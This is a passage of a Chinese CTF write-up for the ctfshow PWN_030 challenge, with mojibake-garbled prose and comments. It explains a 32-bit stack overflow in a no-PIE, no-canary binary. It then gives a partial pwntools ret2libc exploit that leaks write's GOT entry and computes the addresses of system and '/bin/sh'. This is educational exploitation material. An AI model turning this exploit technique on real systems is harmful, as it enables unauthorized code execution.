&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šå…³é—­PIEåï¼›ç¨‹åºçš„åŸºåœ°å€å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°ç¡®å®šå†…å­˜ä¸­å‡½æ•°å’Œå˜é‡çš„ä½ç½®ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_030&#34; &gt;PWN_030&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼šæ²¡å¼€canaryå’ŒPIEï¼Œå¼€äº†NXä¸å¥½ç”¨Shellcodeã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/81.png&#34;
	width=&#34;1219&#34;
	height=&#34;630&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/81_hu_890da67cf56d99a7.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/81_hu_931c9c7556ed7bb5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;193&#34;
		data-flex-basis=&#34;464px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDAx32çœ‹ä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/82.png&#34;
	width=&#34;690&#34;
	height=&#34;215&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/82_hu_598aa473ae731e26.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/82_hu_8f000c14f3a5fcb4.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æ ˆæº¢å‡º&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;320&#34;
		data-flex-basis=&#34;770px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;buf ï¼Œç”¨äºå­˜å‚¨ä»æ ‡å‡†è¾“å…¥è¯»å–çš„æ•°æ®ã€‚è¯¥å˜é‡åœ¨æ ˆä¸Šåˆ†é…ï¼Œç›¸å¯¹äºå‡½æ•°æ ˆå¸§æŒ‡é’ˆ ebp çš„åç§»ä¸º-0x88 ã€‚è°ƒç”¨ read å‡½æ•°ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ã€‚ read å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™é‡Œä½¿ç”¨ 0 è¡¨ç¤ºæ ‡å‡†è¾“å…¥ã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯æŒ‡å‘å­˜å‚¨æ•°æ®çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯ &amp;amp;buf ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¦è¯»å–çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œè¿™é‡Œæ˜¯ 0x100u ï¼Œå³ 256 å­—èŠ‚ï¼Œä½†è¿™charå®šä¹‰bufæ˜¯132å­—èŠ‚ï¼Œæ‰€ä»¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;å¹¶æ— æ‰¾åˆ°åé—¨/bin/shï¼Œé€šè¿‡ret2libcï¼Œé‚£ä»æ ˆæº¢å‡ºä¸‹æ‰‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# è®¾ç½®æ—¥å¿—çº§åˆ«ä¸ºdebugï¼Œæ˜¾ç¤ºè¯¦ç»†è°ƒè¯•ä¿¡æ¯&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;# æŒ‡å®šç›®æ ‡ç¨‹åºä¸º32ä½æ¶æ„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è¿æ¥è¿œç¨‹ç›®æ ‡æœåŠ¡å™¨ï¼Œè‹¥æœ¬åœ°è°ƒè¯•å¯åˆ‡æ¢ä¸ºprocess&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28121&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åŠ è½½ç›®æ ‡ç¨‹åºå’Œå¯¹åº”çš„libcåº“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                  &lt;span class=&#34;c1&#34;&gt;# åŠ è½½æ¼æ´ç¨‹åº&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/ctfshow/libc/32bit/libc-2.27.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# åŠ è½½å¯¹åº”çš„libcåº“&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è·å–å…³é”®åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# ä»ç¨‹åºç¬¦å·è¡¨è·å–writeå‡½æ•°çš„PLTåœ°å€ï¼ˆç”¨äºè°ƒç”¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# ä»ç¨‹åºå…¨å±€åç§»è¡¨è·å–writeå‡½æ•°çš„GOTåœ°å€ï¼ˆå­˜å‚¨çœŸå®åœ°å€ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ctfshow&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ctfshow&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;# è·å–å­˜åœ¨æ ˆæº¢å‡ºçš„ctfshowå‡½æ•°åœ°å€ï¼ˆç”¨äºäºŒæ¬¡æº¢å‡ºï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;140&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# æº¢å‡ºåç§»ï¼šç¼“å†²åŒºå¤§å° + EBPé•¿åº¦ï¼Œé€šè¿‡è°ƒè¯•ç¡®å®š&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ„é€ ç¬¬ä¸€ä¸ªpayloadï¼šæ³„æ¼writeå‡½æ•°çš„çœŸå®åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;# å¡«å……ç¼“å†²åŒºç›´åˆ°è¦†ç›–è¿”å›åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;              &lt;span class=&#34;c1&#34;&gt;# è¦†ç›–è¿”å›åœ°å€ä¸ºwrite@pltï¼Œè°ƒç”¨writeå‡½æ•°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ctfshow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;                &lt;span class=&#34;c1&#34;&gt;# writeæ‰§è¡Œå®Œåè·³å›ctfshowå‡½æ•°ï¼Œä»¥ä¾¿å†æ¬¡æ¥æ”¶è¾“å…¥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;                      &lt;span class=&#34;c1&#34;&gt;# writeå‡½æ•°ç¬¬1ä¸ªå‚æ•°ï¼šæ–‡ä»¶æè¿°ç¬¦1ï¼ˆæ ‡å‡†è¾“å‡ºï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write_got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;              &lt;span class=&#34;c1&#34;&gt;# writeå‡½æ•°ç¬¬2ä¸ªå‚æ•°ï¼šè¦è¯»å–çš„åœ°å€ï¼ˆwriteçš„GOTè¡¨é¡¹ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;                       &lt;span class=&#34;c1&#34;&gt;# writeå‡½æ•°ç¬¬3ä¸ªå‚æ•°ï¼šè¯»å–å­—èŠ‚æ•°ï¼ˆ32ä½åœ°å€å 4å­—èŠ‚ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# å‘é€ç¬¬ä¸€ä¸ªpayloadï¼Œè§¦å‘writeå‡½æ•°æ³„æ¼åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ¥æ”¶æ³„æ¼çš„writeå‡½æ•°çœŸå®åœ°å€ï¼ˆ4å­—èŠ‚ï¼Œ32ä½ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;write_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;u32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;write address: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write_addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# æ‰“å°è·å–åˆ°çš„writeåœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# è®¡ç®—libcåŸºåœ°å€åŠå…³é”®å‡½æ•°åœ°å€&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# libcåŸºåœ°å€ = writeçœŸå®åœ°å€ - libcä¸­writeçš„åç§»&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# systemå‡½æ•°åœ°å€ = åŸºåœ°å€ + systemåœ¨libcä¸­çš„åç§»&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# /bin/shå­—ç¬¦ä¸²åœ°å€ = åŸºåœ°å€ + /bin/shåœ¨libcä¸­çš„åç§»&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;binsh_addr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æ‰“å°è®¡ç®—å¾—åˆ°çš„å…³é”®åœ°å€ï¼ˆè°ƒè¯•ç”¨ï¼‰&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;libc base: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%#x&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
